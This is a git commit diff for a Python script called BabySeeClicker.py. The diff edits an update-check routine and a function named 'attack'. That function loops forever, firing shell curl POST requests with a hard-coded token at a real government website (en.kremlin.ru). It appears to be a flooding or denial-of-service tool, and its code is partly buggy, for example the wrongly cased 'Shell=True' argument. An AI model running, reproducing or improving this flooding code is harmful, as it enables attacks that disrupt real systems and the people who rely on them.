01fccc5d9935cdc45649728fa0c3ea0a5e81bdc4
BabySeeClicker <154383598+BabySeeClicker@users.noreply.github.com>
2023-12-20 00:42:41 +0200

    BabySeeClicker.py

--- BabySeeClicker.py
+++ BabySeeClicker.py
@@ -5,8 +5,8 @@ def udte():
     print("\n[Info] --> Checking for token updates, please wait .....\n\n")
     time.sleep(1)
     uptoken = subprocess.check_output(['git', 'pull'])
-    updtok = re.search(r"Already up to date", str(chupd))
-    upctok = re.search(r"changed,", str(chupd))
+    updtok = re.search(r"Already up to date", str(uptoken))
+    upctok = re.search(r"changed,", str(uptoken))
     if uptoken:
         print("\n[Congrats] --> Babyseeclicker tokens are not changed")
         print(" --> Starting ......")
@@ -43,8 +43,8 @@ def starting():
 	time.sleep(1)
 def attack():
 	while True:
-		token = "CaP9l5efMekDeTaZR37c2qKcqhzR2wekoucaX2vCWWS2Gy6x8dJ7KBpXMD5ixIqj"
-		subprocess.call("curl -X post -d "+token+", "+myep+"  http://en.kremlin.ru/robots.php",Shell=True, stdout=subprocess.DEVNULL)
+		temptoken = "CaP9l5efMekDeTaZR37c2qKcqhzR2wekoucaX2vCWWS2Gy6x8dJ7KBpXMD5ixIqj"
+		subprocess.call("curl -X post -d "+temptoken+", "+myep+"  http://en.kremlin.ru/robots.php",Shell=True, stdout=subprocess.DEVNULL)
 
 udte()
 
